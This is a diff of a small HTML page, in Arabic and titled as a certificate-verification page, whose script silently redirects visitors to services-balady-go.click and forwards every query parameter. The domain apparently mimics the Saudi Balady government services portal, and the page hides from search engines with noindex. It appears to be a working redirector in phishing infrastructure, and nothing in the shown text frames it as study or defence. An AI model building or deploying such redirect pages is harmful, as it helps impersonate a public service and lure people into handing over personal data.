@@ -1,34 +1,38 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>..</title>
-
-    <script>
-        const params = new URLSearchParams(window.location.search);
-
-        const id = params.get("id");
-        const type = params.get("type");
-
-        if (id) {
-            let target = "https://services-balady-go.click/view/" +
-                         encodeURIComponent(id);
-            let server = "31.97.158.88";
-            if (type) {
-                target += "?type=" + encodeURIComponent(type);
-            }
-
-            window.location.replace(target);
-        } else {
-            document.body.innerHTML = `
-                <h2>Invalid request</h2>
-                <p>Missing ID.</p>
-            `;
-        }
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>التحقق من الشهادة</title>
+  <meta name="robots" content="noindex,nofollow">
 </head>
+<body>
+  <main>
+    <h2>جاري تحويلك إلى صفحة التحقق…</h2>
+    <p id="message">يرجى الانتظار.</p>
+  </main>
+  <script>
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const path = window.location.pathname.replace(/^\/view\/?/, "");
+      const pathId = path.split("/").filter(Boolean).pop() || "";
+      const id = params.get("id") || pathId;
 
+      if (!id || id === "view") {
+        document.getElementById("message").textContent =
+          "تعذر فتح الشهادة: رقم الشهادة غير موجود في الرابط.";
+        return;
+      }
 
+      const target = new URL(
+        "https://services-balady-go.click/view/" + encodeURIComponent(id)
+      );
+      params.delete("id");
+      params.forEach(function (value, key) {
+        target.searchParams.append(key, value);
+      });
+      window.location.replace(target.toString());
+    })();
+  </script>
+</body>
 </html>
